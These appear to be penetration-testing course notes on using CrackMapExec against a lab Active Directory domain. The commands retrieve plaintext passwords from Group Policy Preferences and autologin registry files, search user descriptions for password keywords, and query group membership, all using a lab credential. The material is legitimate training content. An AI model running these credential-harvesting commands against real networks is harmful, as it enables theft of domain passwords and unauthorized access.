
# Searching for Accounts in Group Policy Objects
Searching for credentials written in the Group Policy Objects (GPO) can pay off, especially in an old environment (Windows server 2003 / 2008) since every domain user can read the GPOs.

We can use the modules `gpp_password` and `gpp_autologin`. The first module, `gpp_password`, retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences (GPP). We can read more about this attack in this blog post Finding Passwords in SYSVOL & Exploiting Group Policy Preferences, and the second module, `gpp_autologin`, searches the Domain Controller for `registry.xml` files to find autologin information and returns the username and clear text password if present.

Reference: https://adsecurity.org/?p=2288

## Password GPP
```
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! -M gpp_password
```

## AutoLogin GPP
```
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! -M gpp_autologin
```

# Working with Modules
We can run `crackmapexec <protocol> -L` to view available modules for the specified protocol.

> Note: Keep in mind that LDAP protocol communications won't work if we can't resolve the domain FQDN. If we are not connecting to the domain DNS servers, we need to configure the FQDN in the `/etc/hosts` file. Configure the **target IP to the FQDN `dc01.inlanefreight.htb`**.

## Identifying Options in Modules
To view a module's supported options, we can use the following syntax: `crackmapexec <protocol> -M <module_name> --options`

### Looking at the Source Code of the user-desc Module
The LDAP module user-desc will query all users in the Active Directory domain and retrieve their descriptions, it will only display the user's descriptions that match the default keywords, but it will save all descriptions in a file. Default keywords are not provided in the description. If we want to know what those keywords are, we need to look at the source code. We can find the source code in the directory `CrackMapExec/cme/modules/`. Then we can look for the module name and open it. In our case, the Python script that contains the module `user-desc` is `user_description.py`. Let's grep the file to find the word keywords:
```
cat CrackMapExec/cme/modules/user_description.py |grep keywords
```

- **Retrieve User Description Using user-desc Module**
```
crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M user-desc
```
```
nxc ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M user-desc
```
- **Opening File with All Descriptions**
```
cat /home/plaintext/.cme/logs/UserDesc-10.129.203.121-20221031_120444.log
```
- **Using a Module with Options**
```
crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M user-desc -o KEYWORDS=pwd,admin
```
### Querying User Membership
`groupmembership` is another example of a module created during this training by an HTB Academy training developer, which allows us to query the groups to which a user belongs (we will discuss how to create your own modules later). To use it, we need to specify the user we want to query with the option USER.
```
cd CrackMapExec/cme/modules/
wget https://raw.githubusercontent.com/Porchetta-Industries/CrackMapExec/7d1e0fdaaf94b706155699223f984b6f9853fae4/cme/modules/groupmembership.py -q
crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M groupmembership -o USER=julio
````

# MSSQL Enumeration and Attacks


















